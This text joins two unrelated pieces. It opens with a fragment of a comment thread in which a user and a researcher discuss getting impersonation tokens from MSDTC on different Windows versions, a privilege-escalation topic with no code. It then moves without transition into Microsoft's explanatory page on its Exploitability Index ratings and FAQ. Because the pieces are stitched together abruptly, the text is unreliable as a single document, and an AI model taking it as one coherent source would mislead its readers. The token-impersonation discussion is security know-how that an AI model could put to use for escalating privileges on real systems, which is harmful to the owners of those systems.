 SeCreateGlobalPrivilege = 0x00000003 = SE\_PRIVILEGE\_ENABLED\_BY\_DEFAULT+SE\_PRIVILEGE\_ENABLED

Didn't capture the stdout pipe, but next step is to modify output to see what's happening.

FWIW, the MSDTC tokens I'm seeing in the caller's process space are Identity level.

What am I screwing up?

Thanks.

Philip, the privileges on the process are fine so you should always get an impersonation token from MSDTC. Try running the process under NETWORK SERVICE account or other account with impersonation rights to see if that works for you but it should work with any account with impersonation rights.

I'm sorry but I can't answer questions about compilation problems since I don't have enough time to go and try to reproduce your problems, to find a possible solution, etc. Please compile with Visual Studio 2003 to avoid problems.

Thanks for the feedback, Cesar.

While waiting for your reply, I ended up doing a lot of research on this, which was very informative.

I found what I was screwing up: in the original Windows 2003, as with the original Windows XP release (and XP SP1), the RPCSS service runs as SYSTEM (S-1-5-18), not NETWORK SERVICE (S-1-5-19). So I was testing on the wrong versions of Windows.

Once I tested on Windows 2003 SP1, I was able to reproduce your findings. It took me a little while to realize what I did wrong, but it was fun and educational to test this out. I also was able to verify the same MSDTC behavior on XP Service Pack 2 using my own code.

# Microsoft Exploitability Index

The Microsoft Exploitability Index helps customers prioritize security update deployment by providing information on the likelihood that a vulnerability addressed in a Microsoft security update will be exploited.

## The Microsoft Exploitability Index

The Exploitability Index may help customers evaluate risk for a vulnerability. Microsoft evaluates the potential exploitability of each vulnerability associated with a Microsoft security update and then publishes the exploitability information as part of the monthly Microsoft security update details. If after publishing the details Microsoft determines that the Exploitability Index Assessment warrants a change, it will change the assessment and notify customers through technical security notifications. The company will not update the assessment when exploit code is posted that matches the existing exploitability information.

The Exploitability Index uses one of four values to communicate to customers the likelihood of a vulnerability being exploited, based on the vulnerabilities addressed by the Microsoft security update.

| Exploitability index assessment | Short definition |
| --- | --- |
| 0 | Exploitation detected |
| 1 | Exploitation more likely \* |
| 2 | Exploitation less likely \*\* |
| 3 | Exploitation unlikely \*\*\* |

### 0 – Exploitation Detected

Microsoft is aware of an instance of this vulnerability being exploited. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with the highest priority.

### 1 – Exploitation More Likely

Microsoft analysis has shown that exploit code could be created in such a way that an attacker could consistently exploit this vulnerability. Moreover, Microsoft is aware of past instances of this type of vulnerability being exploited. This would make it an attractive target for attackers, and therefore more likely that exploits could be created. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with a higher priority.

### 2 – Exploitation Less Likely

Microsoft analysis has shown that while exploit code could be created, an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product. Moreover, Microsoft has not recently observed a trend of this type of vulnerability being actively exploited in the wild. This makes it a less attractive target for attackers. That said, customers who reviewed the security update and determined its applicability within their environment should still treat this as a material update. If they are prioritizing against other highly exploitable vulnerabilities, they could rank this lower in their deployment priority.

### 3 – Exploitation Unlikely

Microsoft analysis shows that successfully functioning exploit code is unlikely to be utilized in real attacks. This means that while it might be possible for exploit code to be released that could trigger the vulnerability and cause abnormal behavior, the full impact of exploitation will be more limited. Moreover, Microsoft has not observed instances of this type of vulnerability being actively exploited in the past. Thus, the actual risk of being exploited from this vulnerability is significantly lower. Therefore, customers who have reviewed the security update to determine its applicability within their environment could prioritize this update below other vulnerabilities within a release.

In those scenarios where multiple product series are affected, for instance a vulnerability that affects both Windows and Office, the rating reflects the highest risk level across both products. Likewise, the rating reflects the highest risk present across all versions of the product.  In this case, if the Exploitability Assessment on the latest version of Office is "1," and on the latest version of Windows is "2," the rating will reflect "1."  If the XI rating for Windows 10 version 2004 is “2” and the rating for Windows 7 is “1”, the rating will reflect “1”.

## Important Terms and Definitions

**Exploit Code** – A software program or sample code that, when executed against a vulnerable system, uses the vulnerability to spoof attacker identity, tamper with user or system information, repudiate attacker action, disclose user or system information on the server side, deny service to valid users, or elevate privileges for the attacker. For example, if a vulnerability had a security impact of remote code execution, Exploit Code could cause remote code execution to occur when run against a target system.

**Trigger a Vulnerability** – The ability to reach the vulnerable code, but not always achieving the maximum impact. For example, it may be easy to trigger a remote code execution vulnerability, but the resulting effect may only be a denial of service.

* ### What is the Microsoft Exploitability Index?

  The Microsoft Exploitability Index provides additional information to help customers prioritize their deployment of the monthly security updates. Microsoft designed this index to provide customers guidance concerning the likelihood of exploitation, based on each vulnerability addressed by Microsoft security updates.
* ### Why did Microsoft create the Exploitability Index?

  Customers asked for more information to help them prioritize their deployment of Microsoft security updates each month, specifically requesting details about the likelihood of exploitation for the vulnerabilities addressed in security updates. The Exploitability Index provides guidance about the actual risk of exploitation of a vulnerability at the time of the security update’s release.
* ### How are vulnerabilities rated?

  Microsoft Exploitability Index focuses on two aspects of a vulnerability to build its ratings:
  1. Current exploitation trends, based on telemetry data and awareness of exploitation of a particular type of vulnerability in a particular product,
  2. The cost and reliability of building a working exploit for the vulnerability, based on a technical analysis of the vulnerability.
* ### Is this a truly reliable rating system?

  While reliably predicting activity within the security ecosystem is always difficult, there are three reasons why this system should be useful. First, over the last few years we have realized that many security researchers analyze the updates associated with Microsoft's security updates the day they are released to create and evaluate protections. In doing so, many of these researchers also create exploit code to test them. The methodology used to develop this exploit code is like the one Microsoft uses to determine the likelihood of exploit code release. Microsoft analyzes the updates themselves, the nature of the vulnerability, and the conditions that must be met for an exploit to execute successfully. Second, not all vulnerabilities resolved by our security updates are exploited. A vulnerability may well be technically exploitable with a high degree of reliability, but it may never be exploited. We continuously monitor and track exploitation activity to keep up to date with current trends. This in turn informs our opinion of what constitutes a more attractive vulnerability over similar vulnerabilities, and enables us to more accurately communicate an actual risk, rather than a potential one from the vulnerabilities we patch.
  Finally, we are also partnering with protection providers through the Microsoft Active Protections Program (MAPP), working with them to help validate our predictions each month – thereby using a community approach to ensure better accuracy through information sharing.
* ### How is the Exploitability Index different from the Security Update Severity Rating system?

  The Security Update Severity Rating System assumes that exploitation will be successful. For some vulnerabilities where exploitability is high, this assumption is very likely to be true for a broad set of attackers. For other vulnerabilities where exploitability is low, this assumption may only be true when a dedicated attacker puts a lot of resources into ensuring their attack is successful. Regardless of the Severity or Exploitability Index rating, Microsoft always recommends that customers deploy all applicable and available updates; however, this rating information can assist sophisticated customers in prioritizing their approach to each month's release.
* ### How are Denial of Service, Tampering, Information Disclosure, or Spoofing issues rated?

  The Exploitability Index does not differentiate between vulnerability types. It focuses on the likelihood of exploitation of each vulnerability within the range of their full impact potential. Thus, any vulnerability, whether it is Remote Code Execution, Tampering or other, could be rated any of the Exploitability Index ratings.
* ### What happens when newly emerging information requires an update to the Exploitability Index rating?

  The ability to rate the possible exploitation of vulnerabilities is an evolving science, and new techniques for exploitation in general, or unique techniques specific to a vulnerability, or new trends in detected exploits of particular products may be discovered that could change the Exploitability Index rating. However, the goal of the Exploitability Index is to help customers prioritize those updates for the most current monthly release. Therefore, if there is information that would change an assessment released in the first month of a security release, Microsoft will update the Exploitability Index. If information becomes available in subsequent months, after most customers have made their prioritization decisions, the Exploitability Index will not be updated as it is no longer useful to the customer. When an Exploitability Index rating is corrected in a way that reflects increased risk to customers, the security update revision is incremented at a major version number (for instance, from 1.0 to 2.0). When risk is adjusted downwards, the update revision is incremented at a minor version number (for instance, from 1.0 to 1.1).
* ### How does the Exploitability Index relate to the Common Vulnerability Scoring System (CVSS) and other rating systems?

  The Exploitability Index is separate and not related to other rating systems. However, the MSRC is a contributing member to the Common Vulnerability Scoring System (CVSS), and Microsoft shares its experience and customer feedback in building and releasing the Exploitability Index with the working group in order to help ensure the CVSS is effective and actionable.
